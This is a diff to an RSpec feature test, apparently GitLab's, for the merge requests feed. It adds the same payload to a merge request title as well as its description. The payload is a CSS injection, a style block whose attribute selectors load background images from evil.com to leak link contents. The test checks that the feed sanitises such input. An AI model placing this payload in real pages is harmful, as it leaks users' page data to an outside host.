@@ -93,13 +93,16 @@ RSpec.describe 'Merge Requests Feed', feature_category: :devops_reports do
       end
     end
 
-    context 'with potentially malicious description' do
+    context 'with Markdown in the title and a potentially malicious description' do
       let_it_be(:malicious_mr) do
+        payload = '<style>*[href^="a"]{background:url(//evil.com/a)}</style>'
+
         create(:merge_request,
           source_project: project,
           source_branch: 'fix',
           assignees: [assignee],
-          description: "<style>*[href^=\"a\"]{background:url(//evil.com/a)}</style>\n\n**Legitimate text**"
+          title: "#{payload} Fix #{merge_request.to_reference} in `parser`",
+          description: "#{payload}\n\n**Legitimate text**"
         )
       end
 
